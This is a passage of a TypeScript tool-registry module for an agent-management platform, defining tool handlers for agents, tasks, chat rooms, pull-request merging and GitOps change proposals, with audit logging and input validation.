/**
 * Unified Tool Registry — single source of truth for all ORION management tools.
 *
 * Tools are classified by tier (read / write / destructive) and availability context
 * (task / chat / both). The registry is the canonical definition; management-tools.ts
 * and claude.ts import from here rather than duplicating definitions.
 *
 * SOC2 [A-001]: all write/destructive operations are attributed via actorId and logged
 * to the agent-feed audit trail inside the handler logic.
 */

import { prisma } from '@/lib/db'
import { getDefaultModelId } from '@/lib/default-model'
import { generateEmbedding, vectorSearch } from '@/lib/embeddings'
import { exec } from 'child_process'
import { promisify } from 'util'
import { writeFileSync, unlinkSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import tls from 'tls'
import https from 'https'
import http from 'http'
import { DEPLOYMENT_TEMPLATES, getTemplate } from '@/lib/deployment-templates'
import { writeVaultSecret } from '@/lib/vault'
import { randomBytes } from 'crypto'

const execAsync = promisify(exec)

// ── Types ─────────────────────────────────────────────────────────────────────

export type ToolTier = 'read' | 'write' | 'destructive'

export type ToolCategory =
  | 'tasks'        // task lifecycle: create, assign, close, reopen, escalate, inspect
  | 'agents'       // agent lifecycle: create, update, archive, spawn, find
  | 'rooms'        // chat rooms and messaging
  | 'features'     // feature planning and coordination
  | 'gitops'       // GitOps: propose changes, validate manifests, deployment templates
  | 'knowledge'    // knowledge base: search, write, graph
  | 'environment'  // cluster environments: health, config, bootstrap
  | 'secrets'      // secret management
  | 'execution'    // tool execution approval gating
  | 'tools'        // meta: tool discovery, tool requests, nova lookup

export interface ToolDefinition {
  name: string
  description: string
  inputSchema: Record<string, unknown>  // JSON Schema
  tier: ToolTier
  parallelSafe: boolean  // can run concurrently with other read tools
  availableIn: 'task' | 'chat' | 'both'
  category: ToolCategory
  handler: (args: unknown, context: ToolExecutionContext) => Promise<string>
}

export interface ToolExecutionContext {
  agentId?: string
  taskId?: string
  roomId?: string
  environmentId?: string
  userId?: string
  prisma: typeof prisma
  gateway?: {
    executeTool: (name: string, args: Record<string, unknown>) => Promise<string>
    listTools?: () => Promise<Array<{ name: string; description: string; category?: string; inputSchema: Record<string, unknown> }>>
  }
  // Legacy: conversationId used in chat path for propose_tool
  conversationId?: string
}

// ── Registry store ────────────────────────────────────────────────────────────

const _registry = new Map<string, ToolDefinition>()

export function registerTool(def: ToolDefinition): void {
  _registry.set(def.name, def)
}

export function getToolsForContext(ctx: 'task' | 'chat'): ToolDefinition[] {
  return Array.from(_registry.values()).filter(
    t => t.availableIn === ctx || t.availableIn === 'both'
  )
}

/** Return every registered tool regardless of availableIn context. */
export function getAllTools(): ToolDefinition[] {
  return Array.from(_registry.values())
}

export function getToolDefinition(name: string): ToolDefinition | undefined {
  return _registry.get(name)
}

export function getToolsByCategory(category: ToolCategory): ToolDefinition[] {
  return Array.from(_registry.values()).filter(t => t.category === category)
}

export function getAllCategories(): ToolCategory[] {
  const cats = new Set<ToolCategory>()
  for (const t of _registry.values()) cats.add(t.category)
  return Array.from(cats).sort()
}

export async function executeRegisteredTool(
  name: string,
  args: unknown,
  context: ToolExecutionContext,
): Promise<string> {
  const def = _registry.get(name)
  if (!def) return `Error: unknown tool "${name}"`
  try {
    return await def.handler(args, context)
  } catch (e) {
    return `Error: ${e instanceof Error ? e.message : String(e)}`
  }
}

// ── Validation ────────────────────────────────────────────────────────────────

export function validateToolArgs(
  toolName: string,
  args: unknown,
): { valid: boolean; errors: string[] } {
  const def = _registry.get(toolName)
  if (!def) return { valid: true, errors: [] }  // unknown tools pass through

  const schema = def.inputSchema as {
    required?: string[]
    properties?: Record<string, { type?: string }>
  }

  const errors: string[] = []
  const obj = (typeof args === 'object' && args !== null && !Array.isArray(args))
    ? (args as Record<string, unknown>)
    : {}

  // Check required fields
  if (Array.isArray(schema.required)) {
    for (const field of schema.required) {
      if (!(field in obj) || obj[field] === undefined || obj[field] === null || obj[field] === '') {
        errors.push(`field "${field}" is required`)
      }
    }
  }

  // Check field types for fields that are present
  if (schema.properties) {
    for (const [field, prop] of Object.entries(schema.properties)) {
      if (!(field in obj)) continue
      const val = obj[field]
      if (prop.type && val !== undefined && val !== null) {
        const actual = Array.isArray(val) ? 'array' : typeof val
        if (actual !== prop.type) {
          errors.push(`field "${field}" must be ${prop.type} (got ${actual})`)
        }
      }
    }
  }

  return { valid: errors.length === 0, errors }
}

// ── Shared helpers ────────────────────────────────────────────────────────────

// SOC2 [INPUT-001]: mirrors the reserved-name check in POST /api/agents
export const RESERVED_AGENT_NAMES = ['human', 'user', 'system', 'admin']

async function auditLog(actorId: string | undefined, content: string): Promise<void> {
  if (!actorId) return
  await prisma.agentMessage.create({
    data: {
      agentId:     actorId,
      channel:     'agent-feed',
      content,
      messageType: 'task_update',
    },
  }).catch(() => {})
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function parseArgs(args: unknown): any {
  if (typeof args === 'object' && args !== null) return args
  if (typeof args === 'string') {
    try { return JSON.parse(args || '{}') } catch { return {} }
  }
  return {}
}

// ── Tool handlers ─────────────────────────────────────────────────────────────

async function handleListAgents(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { include_archived } = parseArgs(args) as { include_archived?: boolean }
  const agents = await ctx.prisma.agent.findMany({
    orderBy: { name: 'asc' },
    include: { tasks: { where: { status: { in: ['running', 'pending_validation'] } }, select: { id: true }, take: 1 } },
  })
  const filtered = include_archived
    ? agents
    : agents.filter((a: any) => !(a.metadata as any)?.archived)
  return JSON.stringify(
    filtered.map((a: any) => {
      const meta = (a.metadata ?? {}) as Record<string, unknown>
      const cfg  = (meta.contextConfig ?? {}) as Record<string, unknown>
      return {
        id:          a.id,
        name:        a.name,
        type:        a.type,
        status:      a.status,
        role:        a.role ?? null,
        description: a.description ?? null,
        persistent:  !!cfg.persistent,
        busy:        a.tasks.length > 0,
        archived:    !!(meta.archived),
      }
    }),
    null, 2
  )
}

async function handleListTasks(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { status, unassigned_only, assigned_agent_id, since } = parseArgs(args) as {
    status?: string | string[]
    unassigned_only?: boolean
    assigned_agent_id?: string
    since?: string
  }
  const statuses = status
    ? (Array.isArray(status) ? status : [status])
    : ['pending', 'running', 'failed']
  const sinceDate = since ? new Date(since) : undefined
  const tasks = await ctx.prisma.task.findMany({
    where: {
      status: { in: statuses as any },
      ...(unassigned_only ? { assignedAgent: null, assignedUserId: null } : {}),
      ...(assigned_agent_id ? { assignedAgent: assigned_agent_id } : {}),
      ...(sinceDate ? { OR: [{ createdAt: { gte: sinceDate } }, { updatedAt: { gte: sinceDate } }] } : {}),
    },
    include: { agent: { select: { id: true, name: true } } },
    orderBy: [{ priority: 'desc' }, { createdAt: 'asc' }],
    take: 50,
  })
  return JSON.stringify(
    tasks.map((t: any) => ({
      id:            t.id,
      title:         t.title,
      status:        t.status,
      priority:      t.priority,
      assignedAgent: t.agent ? { id: t.agent.id, name: t.agent.name } : null,
      assignedUser:  t.assignedUserId ?? null,
      description:   t.description ? t.description.slice(0, 200) : null,
    })),
    null, 2
  )
}

async function handleAssignTask(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { task_id, agent_id } = parseArgs(args) as { task_id?: string; agent_id?: string }
  if (!task_id) return 'Error: task_id is required'
  if (!agent_id) return 'Error: agent_id is required'

  const targetAgent = await ctx.prisma.agent.findUnique({ where: { id: agent_id }, select: { name: true, status: true, metadata: true } })
  if (!targetAgent) return `Error: agent "${agent_id}" not found`
  const targetMeta = (targetAgent.metadata ?? {}) as Record<string, unknown>
  if (targetMeta.archived === true) {
    return `Error: agent "${targetAgent.name}" is archived and cannot be assigned tasks. Use orion_list_agents to find an active agent.`
  }
  if (targetAgent.status === 'offline') {
    return `Error: agent "${targetAgent.name}" is offline and cannot accept tasks right now. Use orion_list_agents to find an online agent.`
  }

  await ctx.prisma.task.update({
    where: { id: task_id },
    data:  { assignedAgent: agent_id, status: 'pending' },
  })
  const [task, agent] = await Promise.all([
    ctx.prisma.task.findUnique({ where: { id: task_id }, select: { title: true } }),
    ctx.prisma.agent.findUnique({ where: { id: agent_id }, select: { name: true } }),
  ])
  const msg = `📋 Assigned **${task?.title}** → **${agent?.name}**`
  await auditLog(ctx.agentId ?? ctx.userId, msg)
  return `Assigned task "${task?.title}" to agent "${agent?.name}"`
}

async function handleCreateAgent(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const spec = parseArgs(args) as {
    name?: string
    role?: string
    systemPrompt?: string
    type?: string
    description?: string
    persistent?: boolean
    llm?: string
    metadata?: Record<string, unknown>
  }

  if (!spec.name?.trim())         return 'Error: name is required'
  if (!spec.role?.trim())         return 'Error: role is required'
  if (!spec.systemPrompt?.trim()) return 'Error: systemPrompt is required — agents without a system prompt will not behave correctly'
  if (spec.systemPrompt.trim().length < 20) return 'Error: systemPrompt is too short (minimum 20 characters) — provide a meaningful role description'
  if (spec.systemPrompt.trim().length > 10_000) return 'Error: systemPrompt exceeds maximum length (10,000 characters)'

  // Cap total non-archived agents to prevent runaway agent-creation loops.
  const MAX_ACTIVE_AGENTS = 50
  const activeCount = await ctx.prisma.agent.count({
    where: {
      NOT: {
        metadata: { path: ['archived'], equals: true },
      },
    },
  })
  if (activeCount >= MAX_ACTIVE_AGENTS) {
    return `Error: maximum active agent limit (${MAX_ACTIVE_AGENTS}) reached. Archive unused agents before creating new ones.`
  }


  const actorId = ctx.agentId ?? ctx.userId
  if (RESERVED_AGENT_NAMES.includes(spec.name.toLowerCase())) {
    await auditLog(actorId, `⚠️ Cannot create agent: **${spec.name}** is a reserved name`)
    return `Error: "${spec.name}" is a reserved agent name`
  }

  const existingByName = await ctx.prisma.agent.findUnique({
    where:  { name: spec.name.trim() },
    select: { id: true, name: true, role: true, metadata: true },
  })
  if (existingByName) {
    const existingMeta = (existingByName.metadata ?? {}) as Record<string, unknown>
    if (existingMeta.archived === true) {
      return `Error: an archived agent named "${spec.name.trim()}" already exists (id: ${existingByName.id}). Choose a different name — do not reuse archived agent names.`
    }
    return JSON.stringify({ id: existingByName.id, name: existingByName.name, role: existingByName.role, note: 'Agent already exists — returning existing record' }, null, 2)
  }

  const defaultLlm     = await getDefaultModelId()
  const legacyMeta     = (spec.metadata ?? {}) as Record<string, unknown>
  const legacyCfg      = (legacyMeta.contextConfig ?? {}) as Record<string, unknown>
  const resolvedLlm    = spec.llm ?? (legacyCfg.llm as string | undefined) ?? defaultLlm
  const resolvedPrompt = spec.systemPrompt ?? (legacyMeta.systemPrompt as string | undefined) ?? ''
  const contextConfig  = { ...legacyCfg, llm: resolvedLlm, persistent: spec.persistent ?? legacyCfg.persistent ?? false }
  const metadata       = { ...legacyMeta, systemPrompt: resolvedPrompt, contextConfig }

  const created = await ctx.prisma.agent.create({
    data: {
      name:        spec.name.trim(),
      type:        (spec.type && spec.type !== 'human') ? spec.type : 'claude',
      role:        spec.role ?? null,
      description: spec.description ?? null,
      metadata:    metadata as any,
    },
  })
  const msg = `🤖 Created agent **${created.name}** (\`${created.id}\`) — ${created.role ?? 'no role'}`
  await auditLog(actorId, msg)
  return JSON.stringify({ id: created.id, name: created.name, role: created.role }, null, 2)
}

async function handleUpdateAgent(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const spec = parseArgs(args) as {
    agent_id?: string
    role?: string
    description?: string
    systemPrompt?: string
    llm?: string
    mentorReviewedAt?: string
  }
  if (!spec.agent_id) return 'Error: agent_id is required'

  const existing = await ctx.prisma.agent.findUnique({
    where:  { id: spec.agent_id },
    select: { id: true, name: true, metadata: true },
  })
  if (!existing) return `Error: agent ${spec.agent_id} not found`

  const existingMeta = (existing.metadata ?? {}) as Record<string, unknown>
  const existingCfg  = (existingMeta.contextConfig ?? {}) as Record<string, unknown>

  const updatedMeta: Record<string, unknown> = { ...existingMeta }
  if (spec.systemPrompt    !== undefined) updatedMeta.systemPrompt    = spec.systemPrompt
  if (spec.llm             !== undefined) updatedMeta.contextConfig   = { ...existingCfg, llm: spec.llm }
  if (spec.mentorReviewedAt !== undefined) updatedMeta.mentorReviewedAt = spec.mentorReviewedAt

  const data: Record<string, unknown> = { metadata: updatedMeta }
  if (spec.role        !== undefined) data.role        = spec.role
  if (spec.description !== undefined) data.description = spec.description

  await ctx.prisma.agent.update({ where: { id: spec.agent_id }, data })
  if (spec.systemPrompt !== undefined) {
    await auditLog(ctx.agentId ?? ctx.userId, `✏️ Updated agent **${existing.name}** system prompt (${spec.agent_id})`)
  }
  return `Updated agent "${existing.name}" (${spec.agent_id})`
}

async function handleArchiveAgent(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { agent_id, reason } = parseArgs(args) as { agent_id?: string; reason?: string }
  if (!agent_id) return 'Error: agent_id is required'

  const existing = await ctx.prisma.agent.findUnique({
    where: { id: agent_id },
    select: { name: true, metadata: true },
  })
  if (!existing) return `Error: agent ${agent_id} not found`

  const existingMeta = (existing.metadata ?? {}) as Record<string, unknown>
  const contextConfig = (existingMeta.contextConfig ?? {}) as Record<string, unknown>
  if (contextConfig.persistent === true) {
    return `Error: agent "${existing.name}" is a persistent system agent and cannot be archived.`
  }
  await ctx.prisma.agent.update({
    where: { id: agent_id },
    data: {
      metadata: {
        ...existingMeta,
        archived:       true,
        archivedAt:     new Date().toISOString(),
        archivedReason: reason ?? 'Task completed',
      } as any,
    },
  })
  const msg = `📦 Archived agent **${existing.name}** — ${reason ?? 'task completed'}`
  await auditLog(ctx.agentId ?? ctx.userId, msg)
  return `Archived agent "${existing.name}" (${agent_id})`
}

async function handleEscalateTask(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { task_id, user_id } = parseArgs(args) as { task_id?: string; user_id?: string }
  if (!task_id) return 'Error: task_id is required'
  if (!user_id) return 'Error: user_id is required'

  await ctx.prisma.task.update({
    where: { id: task_id },
    data:  { assignedUserId: user_id, status: 'pending' },
  })
  const [task, user] = await Promise.all([
    ctx.prisma.task.findUnique({ where: { id: task_id }, select: { title: true } }),
    ctx.prisma.user.findUnique({ where: { id: user_id }, select: { name: true, username: true } }),
  ])
  const who = user?.name ?? user?.username ?? user_id
  const msg = `👤 Escalated **${task?.title}** → **${who}**`
  await auditLog(ctx.agentId ?? ctx.userId, msg)
  return `Escalated task "${task?.title}" to user "${who}"`
}

async function handleGetTaskEvents(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { task_id, limit } = parseArgs(args) as { task_id?: string; limit?: number }
  if (!task_id) return 'Error: task_id is required'

  const [task, events] = await Promise.all([
    ctx.prisma.task.findUnique({
      where: { id: task_id },
      select: { title: true, status: true, assignedAgent: true, description: true },
    }),
    ctx.prisma.taskEvent.findMany({
      where: { taskId: task_id },
      orderBy: { createdAt: 'asc' },
      take: limit ?? 50,
    }),
  ])

  if (!task) return `Error: task ${task_id} not found`

  return JSON.stringify({
    task: { id: task_id, title: task.title, status: task.status, assignedAgent: task.assignedAgent, description: task.description },
    events: events.map((e: any) => ({
      eventType: e.eventType,
      content:   e.content ? e.content.slice(0, 500) : null,
      agentId:   e.agentId,
      createdAt: e.createdAt,
    })),
    toolCallCount: events.filter((e: any) => e.eventType === 'tool_call').length,
  }, null, 2)
}

async function handleCloseTask(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { task_id, summary } = parseArgs(args) as { task_id?: string; summary?: string }
  if (!task_id) return 'Error: task_id is required'
  if (!summary?.trim()) return 'Error: summary is required'

  const task = await ctx.prisma.task.findUnique({ where: { id: task_id }, select: { title: true, status: true } })
  if (!task) return `Error: task ${task_id} not found`
  if (task.status !== 'pending_validation') {
    return `Error: task is "${task.status}" — orion_close_task only operates on pending_validation tasks`
  }

  await ctx.prisma.task.update({ where: { id: task_id }, data: { status: 'done' } })
  const msg = `✅ Validated & closed **${task.title}** — ${summary}`
  await auditLog(ctx.agentId ?? ctx.userId, msg)
  return `Closed task "${task.title}"`
}

async function handleReopenTask(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { task_id, reason } = parseArgs(args) as { task_id?: string; reason?: string }
  if (!task_id) return 'Error: task_id is required'
  if (!reason?.trim()) return 'Error: reason is required'

  const existing = await ctx.prisma.task.findUnique({ where: { id: task_id }, select: { status: true } })
  if (!existing) return `Error: task ${task_id} not found`
  if (existing.status !== 'pending_validation') {
    return `Error: task is "${existing.status}" — orion_reopen_task only operates on pending_validation tasks`
  }

  await ctx.prisma.task.update({
    where: { id: task_id },
    data:  { status: 'pending', assignedAgent: null },
  })
  const task = await ctx.prisma.task.findUnique({ where: { id: task_id }, select: { title: true } })
  const msg = `🔄 Reopened **${task?.title}** — ${reason ?? 'validation failed'}`
  await auditLog(ctx.agentId ?? ctx.userId, msg)
  return `Reopened task "${task?.title}" — ${reason ?? 'validation failed'}`
}

async function handleMergePR(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const raw = parseArgs(args) as { environment_id?: string; pr_number?: unknown; merge_message?: string }
  const { environment_id, merge_message } = raw
  const pr_number = Number(raw.pr_number)
  if (!environment_id) return 'Error: environment_id is required'
  if (!Number.isInteger(pr_number) || pr_number <= 0) return 'Error: pr_number must be a positive integer'

  const env = await ctx.prisma.environment.findFirst({
    where: { OR: [{ id: environment_id }, { name: { equals: environment_id, mode: 'insensitive' } }] },
  })
  if (!env) return `Error: environment "${environment_id}" not found`
  if (!env.gitOwner || !env.gitRepo) return 'Error: environment has no git repo'

  const { mergePR } = await import('./gitea')
  await mergePR({ owner: env.gitOwner, repo: env.gitRepo, index: pr_number, message: merge_message, style: 'merge' })

  await ctx.prisma.gitOpsPR.updateMany({
    where: { environmentId: env.id, prNumber: pr_number },
    data: { status: 'merged' },
  }).catch((e) => console.error(`[gitea_merge_pr] DB update failed for PR #${pr_number}:`, e))

  const msg = `✅ Merged PR #${pr_number} in ${env.gitOwner}/${env.gitRepo}${merge_message ? ` — ${merge_message}` : ''}`
  await auditLog(ctx.agentId ?? ctx.userId, msg)
  return `Merged PR #${pr_number} in ${env.gitOwner}/${env.gitRepo}.`
}

async function handleClosePR(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const raw = parseArgs(args) as { environment_id?: string; pr_number?: unknown; reason?: string }
  const { environment_id, reason } = raw
  const pr_number = Number(raw.pr_number)
  if (!environment_id) return 'Error: environment_id is required'
  if (!Number.isInteger(pr_number) || pr_number <= 0) return 'Error: pr_number must be a positive integer'

  const env = await ctx.prisma.environment.findFirst({
    where: { OR: [{ id: environment_id }, { name: { equals: environment_id, mode: 'insensitive' } }] },
  })
  if (!env) return `Error: environment "${environment_id}" not found`
  if (!env.gitOwner || !env.gitRepo) return 'Error: environment has no git repo'

  const { closePR } = await import('./gitea')
  await closePR(env.gitOwner, env.gitRepo, pr_number)

  // Update DB record if it exists
  await ctx.prisma.gitOpsPR.updateMany({
    where: { environmentId: env.id, prNumber: pr_number },
    data: { status: 'closed' },
  }).catch((e) => console.error(`[gitea_close_pr] DB update failed for PR #${pr_number}:`, e))

  const msg = `🚫 Closed PR #${pr_number} in ${env.gitOwner}/${env.gitRepo}${reason ? ` — ${reason}` : ''}`
  await auditLog(ctx.agentId ?? ctx.userId, msg)
  return `Closed PR #${pr_number}${reason ? ` — ${reason}` : ''}`
}

async function handleListRooms(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { feature_id } = parseArgs(args) as { feature_id?: string }

  const where: Record<string, unknown> = {}
  if (feature_id) where.featureId = feature_id

  const rooms = await ctx.prisma.chatRoom.findMany({
    where,
    orderBy: { updatedAt: 'desc' },
    take: 50,
    include: {
      _count: { select: { members: true } },
    },
  })

  return JSON.stringify(
    rooms.map((r: any) => ({
      id:          r.id,
      name:        r.name,
      type:        r.type,
      featureId:   r.featureId ?? null,
      taskId:      r.taskId ?? null,
      memberCount: r._count.members,
      createdAt:   r.createdAt,
    })),
    null, 2
  )
}

async function handleSendMessage(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { room_id, content } = parseArgs(args) as { room_id?: string; content?: string }
  if (!room_id)  return 'Error: room_id is required'
  if (!content?.trim()) return 'Error: content is required'

  const actorId = ctx.agentId
  if (!actorId) return 'Error: actorId is required to send messages (SOC2 attribution)'

  const room = await ctx.prisma.chatRoom.findUnique({ where: { id: room_id }, select: { name: true } })
  if (!room) return `Error: room ${room_id} not found`

  const membership = await ctx.prisma.chatRoomMember.findUnique({
    where: { roomId_agentId: { roomId: room_id, agentId: actorId } },
  })
  if (!membership) return `Error: you are not a member of room "${room.name}" — agents may only send messages to rooms they belong to`

  await ctx.prisma.chatMessage.create({
    data: {
      roomId:     room_id,
      agentId:    actorId,
      senderType: 'agent',
      content:    content.trim(),
    },
  })

  await auditLog(actorId, `💬 Sent message to room **${room.name}** (${room_id})`)
  return `Message posted to room "${room.name}" (${room_id})`
}

async function handleSetGoal(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { room_id, goal } = parseArgs(args) as { room_id?: string; goal?: string }
  if (!room_id) return 'Error: room_id is required'
  if (!goal?.trim()) return 'Error: goal is required'

  const room = await ctx.prisma.chatRoom.findUnique({ where: { id: room_id } })
  if (!room) return `Error: room ${room_id} not found`

  // Abandon any existing active goal
  await ctx.prisma.roomGoal.updateMany({
    where: { roomId: room_id, status: 'active' },
    data: { status: 'abandoned', completedAt: new Date() },
  })

  // Create new goal record
  const newGoal = await ctx.prisma.roomGoal.create({
    data: {
      roomId: room_id,
      text: goal.trim(),
      status: 'active',
      setBy: ctx.agentId ?? ctx.userId ?? null,
    },
  })

  // Post system message and capture its ID
  const msg = await ctx.prisma.chatMessage.create({
    data: { roomId: room_id, senderType: 'system', content: `🎯 Goal set: ${goal.trim()}` },
  })
  await ctx.prisma.roomGoal.update({
    where: { id: newGoal.id },
    data: { startMessageId: msg.id },
  })

  return `Goal set in room "${room.name}": ${goal.trim()}`
}

async function handleCompleteGoal(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { room_id, verification_summary } = parseArgs(args) as { room_id?: string; verification_summary?: string }
  if (!room_id) return 'Error: room_id is required'
  if (!verification_summary?.trim()) return 'Error: verification_summary is required — describe what you actually checked to confirm the goal is complete (pod status, endpoint tests, etc.)'
  // Reject summaries that are too vague to be meaningful
  if (verification_summary.trim().length < 20) return 'Error: verification_summary is too vague — describe the specific checks you ran and what they showed'

  const room = await ctx.prisma.chatRoom.findUnique({ where: { id: room_id } })
  if (!room) return `Error: room ${room_id} not found`

  const activeGoalRecord = await ctx.prisma.roomGoal.findFirst({
    where: { roomId: room_id, status: 'active' },
    orderBy: { createdAt: 'desc' },
  })
  if (!activeGoalRecord) return `Error: no active goal found in room ${room_id}`

  await ctx.prisma.roomGoal.update({
    where: { id: activeGoalRecord.id },
    data: {
      status: 'completed',
      completionSummary: verification_summary.trim(),
      completedAt: new Date(),
    },
  })

  await ctx.prisma.chatMessage.create({
    data: { roomId: room_id, senderType: 'system', content: `✓ Goal completed: ${verification_summary.trim()}` },
  })

  if (ctx.agentId) await auditLog(ctx.agentId, `✅ Goal complete in room **${room.name}**: ${activeGoalRecord.text} — Verification: ${verification_summary.trim()}`)
  return `Goal "${activeGoalRecord.text}" marked complete. Verification: ${verification_summary.trim()}`
}

async function handleCreateFeature(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { epicId, title, description } = parseArgs(args) as {
    epicId?: string
    title?: string
    description?: string
  }
  if (!epicId) return 'Error: epicId is required'
  if (!title?.trim()) return 'Error: title is required'

  const epic = await ctx.prisma.epic.findUnique({ where: { id: epicId } })
  if (!epic) return `Error: epic ${epicId} not found`
  if (!epic.plan) {
    return 'Error: Epic must have a saved plan before features can be created. Use the Save as Plan button or ask the user to save the plan first.'
  }

  const actorId = ctx.agentId ?? ctx.userId
  const feature = await ctx.prisma.feature.create({
    data: {
      epicId,
      title: title.trim(),
      description: description || null,
      createdBy: actorId ?? 'agent',
    },
  })
  await auditLog(actorId, `✨ Created feature **${feature.title}** (\`${feature.id}\`) under epic \`${epicId}\``)
  return JSON.stringify({ id: feature.id, title: feature.title, epicId: feature.epicId }, null, 2)
}

async function handleCreateTask(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { featureId, title, description, plan, targetEnvironment, dedup_key } = parseArgs(args) as {
    featureId?: string
    title?: string
    description?: string
    plan?: string
    dedup_key?: string
    targetEnvironment?: { namespace?: string; hostname?: string; storageClass?: string; vaultPath?: string }
  }
  if (!featureId) return 'Error: featureId is required'
  if (!title?.trim()) return 'Error: title is required'
  if (!plan?.trim()) return 'Error: plan is required'

  const feature = await ctx.prisma.feature.findUnique({ where: { id: featureId } })
  if (!feature) return `Error: feature ${featureId} not found`
  if (!feature.plan) {
    return 'Error: Feature must have a saved plan before tasks can be created.'
  }

  if (dedup_key?.trim()) {
    const existing = await ctx.prisma.task.findFirst({
      where: {
        featureId,
        status:   { in: ['pending', 'running', 'pending_validation'] },
        metadata: { path: ['dedup_key'], equals: dedup_key.trim() },
      },
      select: { id: true, title: true },
    })
    if (existing) {
      return JSON.stringify({ id: existing.id, title: existing.title, duplicate: true, message: 'Task already exists for this issue — skipped.' })
    }
  }

  const actorId = ctx.agentId ?? ctx.userId
  const task = await ctx.prisma.task.create({
    data: {
      featureId,
      title:       title.trim(),
      description: description || null,
      plan:        plan.trim(),
      status:      'pending',
      priority:    'medium',
      createdBy:   actorId ?? 'agent',
      metadata:    {
        ...(targetEnvironment ? { targetEnvironment } : {}),
        ...(dedup_key?.trim() ? { dedup_key: dedup_key.trim() } : {}),
      } as object,
    },
  })
  await auditLog(actorId, `📋 Created task **${task.title}** (\`${task.id}\`) under feature \`${featureId}\`${targetEnvironment?.namespace ? ` → namespace: ${targetEnvironment.namespace}` : ''}`)
  return JSON.stringify({ id: task.id, title: task.title, featureId: task.featureId, plan: task.plan, targetEnvironment: targetEnvironment ?? null }, null, 2)
}

async function handleProposeGitops(args: unknown, ctx: ToolExecutionContext): Promise<string> {
  const { environment_id, title, reasoning, operation_description, changes } = parseArgs(args) as {
    environment_id?: string
    title?: string
    reasoning?: string
    operation_description?: string
    changes?: Array<{ path: string; content: string }>
  }

  if (!environment_id || !title || !reasoning || !operation_description || !changes?.length) {
    return 'Error: environment_id, title, reasoning, operation_description, and changes are all required'
  }

  try {
    const { proposeChange } = await import('./gitops')

    const env = await ctx.prisma.environment.findFirst({
      where: { OR: [{ id: environment_id }, { name: { equals: environment_id, mode: 'insensitive' } }] },
    })
    if (!env) return `Error: environment "${environment_id}" not found`
    if (!env.gitOwner || !env.gitRepo) {
      return 'Error: environment has no git repo — run bootstrap first'
    }

    // Deduplication guard — if there's already an open PR for this environment with a similar
    // title, return it instead of creating another one. This prevents agents from spamming PRs
    // when they retry the same deployment step multiple times.
    const existingPR = await ctx.prisma.gitOpsPR.findFirst({
      where: {
        environmentId: env.id,
        status: 'open',
        title: { contains: title!.slice(0, 30), mode: 'insensitive' },
      },
      orderBy: { createdAt: 'desc' },
    })
    if (existingPR) {
      return `PR #${existingPR.prNumber} already exists for this deployment: "${existingPR.title}". URL: ${existingPR.prUrl}\n\nDo not create another PR — wait for this one to be reviewed and merged, or check ArgoCD sync status.`
    }

    const policy = (env.policyConfig ?? {}) as { overrides?: Record<string, string>; reviewAll?: boolean }

    // Live ArgoCD path discovery — query the cluster for the Application watching this repo.
    // This is the authoritative source of truth; DB repoPath is a fallback only.
    let liveWatchedPath: string | undefined
    try {
      const { customApi } = await import('./k8s')
      const apps = await customApi.listClusterCustomObject('argoproj.io', 'v1alpha1', 'applications')
      const items: any[] = apps?.body?.items ?? []
      const matchingApp = items.find((app: any) => {
        const src = app?.spec?.source
        if (!src) return false
        const repoUrl: string = src.repoURL ?? ''
        return repoUrl.includes(env.gitRepo!) || repoUrl.endsWith(`/${env.gitRepo}`)
      })
      if (matchingApp?.spec?.source?.path) {
        liveWatchedPath = (matchingApp.spec.source.path as string).replace(/\/$/, '')
      }
    } catch {
      // Cluster unreachable or ArgoCD not installed — fall through to DB repoPath
    }

    // Enforce repo path convention — prepend watched path if agent omitted it, then hard-reject
    // any path that still escapes the watched directory (e.g. absolute paths, ../traversal)
    // Live ArgoCD path takes precedence over DB repoPath.
    const repoPath = liveWatchedPath ?? ((env as Record<string, unknown>).repoPath as string | undefined)

    // Fail closed when repoPath cannot be determined: the path escape check only
    // runs inside `if (repoPath)`, so without it all paths are allowed through
    // including .github/workflows/, ArgoCD root, and other sensitive directories.
    if (!repoPath) {
      return `Error: cannot determine the watched repo path for this environment (ArgoCD unreachable and no repoPath in environment config). Configure repoPath in environment settings or ensure ArgoCD is accessible before proposing changes.`
    }

    const normalizedChanges = changes.map(c => ({
      ...c,
      path: c.path.startsWith(`${repoPath}/`) ? c.path : `${repoPath}/${c.path}`,
    }))

    if (repoPath) {
      const escaping = normalizedChanges.filter(c => !c.path.startsWith(`${repoPath}/`))
      if (escaping.length > 0) {
        const source = liveWatchedPath ? 'live ArgoCD Application' : 'environment config'
        return `Error: the following paths fall outside the watched directory "${repoPath}/" (from ${source}). All manifests must live under ${repoPath}/<service>/. Pass service-relative paths only (e.g. "tailscale/deployment.yaml", not "/tailscale/deployment.yaml"):\n${escaping.map(c => `  - ${c.path}`).join('\n')}\n\nCall gitops_ls to see the existing structure before proposing files.`
      }
    }

    const result = await proposeChange({
      owner: env.gitOwner,
      repo: env.gitRepo,
      title,
      reasoning,
      operationDescription: operation_description,
      changes: normalizedChanges,
      policy,
    })

    const vaultPathPrefix = (env as Record<string, unknown>).vaultPathPrefix as string | undefined
    const action = result.merged
      ? `auto-merged (${result.classification.reason})`
      : `opened for review — ${result.classification.reason}`

    // Persist the PR so the dashboard can surface pending reviews
    await ctx.prisma.gitOpsPR.create({
      data: {
        environmentId: env.id,
        prNumber:  result.prNumber,
        title:     title!,
        operation: result.classification.operation,
        decision:  result.classification.decision,
        status:    result.merged ? 'merged' : 'open',
        prUrl:     result.prUrl,
        reasoning: reasoning ?? null,
        branch:    result.branch,
